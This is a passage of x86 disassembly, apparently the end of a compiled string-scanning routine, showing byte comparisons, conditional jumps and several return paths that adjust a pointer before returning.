  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
